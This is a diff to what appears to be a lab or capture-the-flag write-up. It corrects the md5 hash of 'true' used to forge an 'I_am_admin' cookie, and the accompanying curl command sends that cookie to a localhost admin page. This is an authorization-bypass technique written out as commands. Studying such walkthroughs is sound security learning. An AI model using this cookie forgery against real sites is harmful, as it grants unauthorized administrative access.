@@ -39,13 +39,13 @@ if (isset($_COOKIE['I_am_admin'])) {
 
 ```bash
 echo -n "true" | md5sum
-# Output: b326b5662b5cc7f0a5e15f92ebb8a0d5
+# Output: b326b5062b2f0e69046810717534cb09
 ```
 
 2. Set the cookie in your request:
 
 ```bash
-curl -i -b "I_am_admin=b326b5662b5cc7f0a5e15f92ebb8a0d5" \
+curl -i -b "I_am_admin=b326b5062b2f0e69046810717534cb09" \
      "http://localhost:8080/index.php?page=admin"
 ```
 
